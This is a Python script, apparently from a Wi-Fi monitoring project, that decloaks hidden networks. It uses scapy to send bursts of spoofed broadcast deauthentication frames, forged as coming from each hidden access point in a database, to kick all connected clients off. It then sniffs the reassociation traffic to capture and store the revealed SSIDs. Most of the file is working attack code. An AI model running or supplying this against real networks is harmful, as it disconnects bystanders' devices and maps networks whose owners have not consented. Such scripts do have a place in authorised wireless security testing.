"""Active hidden SSID decloak — deauth clients to force reconnect, capture revealed SSIDs.

Targets: hidden-SSID BSSIDs from the AP inventory.
Method: Send a short deauth burst per BSSID, then sniff for probe responses
        revealing the actual SSID during client reassociation.

Must run as root. Requires monitor-mode interface.
"""

import sqlite3
import sys
import time

from ssid_monitor.config import load_config as _load_config

try:
    _cfg = _load_config()
    DB_PATH = _cfg.db_path
    INTERFACE = _cfg.wifi_interface
except Exception:
    DB_PATH = "/var/lib/dpmb/events.db"
    INTERFACE = "wlan1"
DEAUTH_COUNT = 5          # frames per burst
SNIFF_TIMEOUT = 4         # seconds to listen after each burst


def decloak(bssid_filter=None):
    from scapy.all import (
        Dot11, Dot11Deauth, Dot11ProbeResp, Dot11Elt,
        RadioTap, sendp, sniff, conf,
    )

    conf.iface = INTERFACE

    db = sqlite3.connect(DB_PATH, timeout=5)
    db.row_factory = sqlite3.Row

    # Get hidden APs
    if bssid_filter:
        hidden = db.execute(
            "SELECT bssid, channel, encryption FROM access_points WHERE ssid = '' AND bssid LIKE ?",
            (bssid_filter,),
        ).fetchall()
    else:
        hidden = db.execute(
            "SELECT bssid, channel, encryption FROM access_points WHERE ssid = ''"
        ).fetchall()

    if not hidden:
        print("No hidden APs found.")
        db.close()
        return

    print(f"Targeting {len(hidden)} hidden BSSIDs for decloak...")
    print()

    decloaked = {}

    for ap in hidden:
        bssid = ap["bssid"]
        channel = ap["channel"] or 6

        print(f"[*] {bssid} (CH{channel}, {ap['encryption']})")

        # Hop to target channel
        import subprocess
        subprocess.run(
            ["iw", "dev", INTERFACE, "set", "channel", str(channel)],
            capture_output=True, timeout=5,
        )
        time.sleep(0.2)

        # Build deauth frame: from AP to broadcast (kick all clients)
        deauth = (
            RadioTap() /
            Dot11(
                type=0, subtype=12,
                addr1="ff:ff:ff:ff:ff:ff",  # broadcast
                addr2=bssid,                 # spoofed as AP
                addr3=bssid,
            ) /
            Dot11Deauth(reason=7)
        )

        # Send deauth burst
        print(f"    Sending {DEAUTH_COUNT} deauth frames...")
        sendp(deauth, count=DEAUTH_COUNT, inter=0.05, verbose=False)

        # Sniff for probe responses from this BSSID revealing the SSID
        print(f"    Listening {SNIFF_TIMEOUT}s for probe response...")
        revealed_ssid = None

        def handle_pkt(pkt):
            nonlocal revealed_ssid
            if not pkt.haslayer(Dot11):
                return
            dot11 = pkt[Dot11]
            # Probe response (subtype 5) or beacon (subtype 8) from target BSSID
            if dot11.subtype in (5, 8):
                src = (dot11.addr2 or "").lower()
                if src == bssid.lower():
                    elt = pkt.getlayer(Dot11Elt)
                    while elt:
                        if elt.ID == 0 and elt.info:
                            ssid = elt.info.decode("utf-8", errors="replace")
                            if ssid:
                                revealed_ssid = ssid
                                return
                        elt = elt.payload.getlayer(Dot11Elt)

        sniff(
            iface=INTERFACE,
            filter="type mgt",
            timeout=SNIFF_TIMEOUT,
            prn=handle_pkt,
            store=False,
        )

        if revealed_ssid:
            print(f"    >>> DECLOAKED: {revealed_ssid}")
            decloaked[bssid] = revealed_ssid
            # Update database
            db.execute(
                "UPDATE access_points SET ssid = ? WHERE bssid = ? AND ssid = ''",
                (revealed_ssid, bssid),
            )
            db.commit()
        else:
            print(f"    (no SSID revealed)")

        print()

    # Summary
    print("=" * 60)
    print(f"Results: {len(decloaked)}/{len(hidden)} decloaked")
    for bssid, ssid in decloaked.items():
        print(f"  {bssid} -> {ssid}")

    if len(decloaked) < len(hidden):
        still = [ap["bssid"] for ap in hidden if ap["bssid"] not in decloaked]
        print(f"\nStill hidden ({len(still)}):")
        for b in still:
            print(f"  {b}")

    db.close()


if __name__ == "__main__":
    # Usage: python _decloak_active.py [--bssid PREFIX]
    # Examples:
    #   python _decloak_active.py                   # all hidden APs
    #   python _decloak_active.py --bssid "e8:d3:%"  # only matching BSSIDs
    bssid = None
    if "--bssid" in sys.argv:
        idx = sys.argv.index("--bssid")
        if idx + 1 < len(sys.argv):
            bssid = sys.argv[idx + 1]
    decloak(bssid_filter=bssid)
